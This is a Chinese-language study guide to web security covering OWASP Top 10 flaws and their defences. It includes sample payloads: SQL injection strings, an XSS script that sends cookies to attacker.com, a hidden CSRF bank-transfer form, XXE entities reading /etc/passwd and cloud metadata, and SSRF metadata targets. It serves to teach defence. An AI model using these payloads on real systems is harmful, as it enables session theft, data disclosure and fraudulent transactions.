---
aliases: [WebSecurity]
tags: ['Cybersecurity', 'WebSecurity']
---

# Web 安全完全指南

## 概述

Web 安全是网络安全中最贴近应用层的领域，涵盖了从浏览器到服务端、从 API 到容器的全线攻击面。OWASP Top 10 是最权威的 Web 漏洞分类标准，每 3-4 年更新一次。

---

## 一、OWASP Top 10 核心漏洞

| 漏洞类别 | 攻击原理 | 典型攻击载荷 | 防护措施 |
|----------|----------|-------------|----------|
| SQL 注入 | 用户输入拼入 SQL 语句 | `' OR 1=1 --` | 参数化查询 |
| XSS 跨站脚本 | 恶意脚本注入网页 | `<script>fetch(cookie)</script>` | CSP + 输出转义 |
| CSRF 跨站请求伪造 | 利用用户已登录身份 | 隐藏表单提交 | CSRF Token + SameSite |
| SSRF 服务端请求伪造 | 诱导服务器访问内网 | `http://169.254.169.254/` | URL 白名单 |
| RCE 远程代码执行 | 未过滤输入被执行 | 反序列化漏洞 | 输入校验 + 沙箱 |
| 文件上传漏洞 | 上传恶意文件 | WebShell `.php` | 白名单 + 内容检测 |
| IDOR 水平越权 | 直接引用对象 ID | `/api/user/123` | 权限校验 |
| XXE XML 外部实体 | 解析外部实体 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 禁用外部实体 |

---

## 二、SQL 注入

### 2.1 SQL 注入类型

| 类型 | 描述 | 典型特征 |
|------|------|----------|
| In-band (Error-based) | 利用错误信息获取数据 | 数据库错误回显 |
| In-band (Union-based) | 使用 UNION 合并查询结果 | `UNION SELECT 1,2,3--` |
| Blind (Boolean-based) | 通过页面真假判断条件 | `' AND 1=1 --` / `' AND 1=2 --` |
| Blind (Time-based) | 通过响应延迟推断 | `'; WAITFOR DELAY '0:0:5'--` |
| Out-of-band | 通过 DNS/HTTP 外带数据 | `LOAD_FILE(concat(\\,query,\.attacker.com))` |

### 2.2 注入示例

```sql
-- 原始查询
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- 注入: username = admin' --
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xxx'
-- 绕过认证！

-- 盲注: 逐字符判断
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a' --
```

### 2.3 防护措施

| 措施 | 原理 | 有效性 |
|------|------|--------|
| 参数化查询 / Prepared Statement | SQL 语句与数据分离 | 完全防御（推荐） |
| ORM 框架 | 对象关系映射（如 SQLAlchemy） | 大部分场景有效 |
| 输入白名单校验 | 只允许合法字符 | 辅助手段 |
| WAF（Web 应用防火墙） | 规则匹配拦截恶意请求 | 无法防御逻辑漏洞 |
| 最小数据库权限 | 应用账户仅限必要操作 | 减小危害面 |

```python
# 安全: 参数化查询 (Python + sqlite3)
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# 不安全: 字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
```

---

## 三、XSS 跨站脚本攻击

### 3.1 XSS 三大类型

| 类型 | 触发方式 | 持久性 | 危害范围 |
|------|----------|--------|----------|
| Reflected XSS（反射型） | URL 参数注入 | 非持久 | 单个受害者 |
| Stored XSS（存储型） | 数据存入数据库 | 持久 | 所有访问者 |
| DOM-based XSS | 客户端 JS 动态修改 DOM | 非持久 | 取决于页面逻辑 |

### 3.2 攻击示例

```javascript
// Stored XSS: 评论框中插入
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// DOM-based XSS: URL hash 注入
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = name;
// 访问: https://site.com/#<img src=x onerror=alert(1)>
```

### 3.3 防御体系

| 防御层 | 技术手段 | 说明 |
|--------|----------|------|
| 输入侧 | 输入验证 + 白名单 | 拒绝可疑字符 |
| 输出侧 | HTML 实体编码 | `<` → `&lt;`，`"` → `&quot;` |
| 传输层 | Content Security Policy (CSP) | 限制脚本来源 |
| Cookie | HttpOnly 标记 | 防止 JS 读取 Cookie |
| 框架 | React/Vue 自动转义 | 默认防御大部分 XSS |

```
CSP 示例:
  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

HttpOnly Cookie:
  Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
```

---

## 四、CSRF 跨站请求伪造

### 4.1 攻击原理

CSRF 利用用户在目标网站的已登录状态，诱导用户点击恶意链接或提交表单，执行非本意的操作。

```html
<!-- 攻击者页面 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none"/>

<!-- 或自动提交表单 -->
<form action="https://bank.com/transfer" method="POST" id="csrf_form">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById('csrf_form').submit();</script>
```

### 4.2 防御方案对比

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| CSRF Token | 每个表单嵌入随机 Token 并验证 | 成熟可靠 | 需服务端状态 |
| SameSite Cookie (Lax/Strict) | 限制跨站请求携带 Cookie | 无需额外代码 | 部分场景兼容性问题 |
| 双重 Cookie | 请求体中的值与 Cookie 值比对 | 无状态 | 子域名可窃取 |
| Referer/Origin 验证 | 检查请求来源 | 简单 | 部分场景缺失 |

---

## 五、SSRF 服务端请求伪造

SSRF 攻击者控制服务端发起请求，通常用于访问内部网络资源。

```
高危 SSRF 目标:
  AWS Metadata:    http://169.254.169.254/latest/meta-data/
  GCP Metadata:    http://metadata.google.internal/computeMetadata/v1/
  K8s API Server:  https://kubernetes.default.svc
  内网数据库:     http://localhost:5432

防御措施:
  1. URL 白名单（仅允许特定域名）
  2. 禁用重定向
  3. 限制服务端请求协议（仅 HTTP/HTTPS）
  4. 网络层隔离（VPC 策略）
  5. 关闭不必要的 URL 解析功能
```

---

## 六、认证与授权漏洞

### 6.1 常见认证缺陷

| 漏洞 | 描述 | 案例 |
|------|------|------|
| Session Fixation | 强制使用已知会话 ID | 登录前后不更换 Session |
| JWT 攻击 | 算法混淆、密钥泄露 | `alg: none` 绕过签名 |
| OAuth 配置错误 | redirect_uri 未严格校验 | 授权码劫持 |
| 弱密码策略 | 允许常见弱口令 | `admin/admin123` |
| 暴力破解 | 无登录频率限制 | 遍历密码字典 |

### 6.2 JWT 安全

```python
# JWT 结构: Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.
sJ3xT0z0fG5q6z8A7c9d0e1f2g3h4i5j6k7l8m9n0o1p

# 常见攻击:
# 1. 修改 alg 为 "none"
# 2. 将 RS256 改为 HS256（用公钥签名）
# 3. 泄露的 secret/private key
```

---

## 七、文件上传漏洞

```
攻击方式:
  - WebShell: 上传 .php/.jsp/.asp → 远程执行命令
  - SVG 上传: 嵌入 XSS payload
  - 大文件上传: 耗尽磁盘空间
  - MIME 类型绕过: Content-Type: image/jpeg 但内容是 PHP

防御措施:
  白名单扩展名   → 只允许 jpg/png/pdf/gif
  内容检测       → 检查文件魔数 (Magic Number)
  文件名重命名   → 使用 UUID 存储
  限制文件大小   → 设置 upload_max_filesize
  使用 CDN/对象存储 → 分离存储与执行环境
  禁止执行权限   → 上传目录取消脚本执行
```

---

## 八、XXE XML 外部实体攻击

```xml
<!-- 恶意 XML 读取文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- XXE 导致 SSRF -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- 防护: 禁用外部实体解析 -->
<!-- Python: parser = etree.XMLParser(resolve_entities=False) -->
<!-- Java: DocumentBuilderFactory.setExpandEntityReferences(false) -->
```

---

## 九、容器与云原生安全

### 9.1 容器安全要点

| 风险 | 说明 | 防护 |
|------|------|------|
| 镜像漏洞 | 基础镜像含 CVE | 定期扫描（Trivy, Snyk） |
| 容器逃逸 | 突破容器隔离 | 非 root 运行 + seccomp |
| 敏感信息 | 镜像内硬编码密钥 | 密钥管理服务（Vault） |
| 资源滥用 | 容器消耗宿主机资源 | 限制 CPU/内存/磁盘 |
| 供应链攻击 | 恶意第三方镜像 | 镜像签名验证 |

### 9.2 Kubernetes 安全

```
RBAC 最小权限 → 禁止集群角色绑定给普通 Pod
NetworkPolicy  → 限制 Pod 间通信
PodSecurityPolicy → 禁止特权容器
Secrets 加密 → etcd 加密静态数据
审计日志 → 启用 API 审计
运行时安全 → Falco 检测异常行为
```

---

## 十、API 安全

| 风险 | 描述 | 防护 |
|------|------|------|
| 缺乏认证 | API 无需认证即可访问 | 强制 API Key / OAuth2 |
| 速率限制缺失 | 可暴力遍历 | API 限流（令牌桶算法） |
| 批量赋值 | 客户端可修改不应修改的字段 | 明确 DTO 白名单 |
| 过度数据暴露 | 响应包含敏感字段 | 字段级筛选 |
| 不安全的直接对象引用 | IDOR | 权限校验 |
| GraphQL 深度查询 | 嵌套查询导致 DoS | 查询深度限制 + 配额 |

---

## 相关条目

- [[NetworkSecurity]]
- [[PenetrationTesting]]
- Cryptography
- OWASP

## 参考资源

- OWASP Top 10: https://owasp.org/www-project-top-ten
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org
- 《The Web Application Hacker's Handbook》— Stuttard & Pinto
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- CWE/SANS Top 25: https://cwe.mitre.org/top25
- 《Web 安全深度剖析》— 张兆森
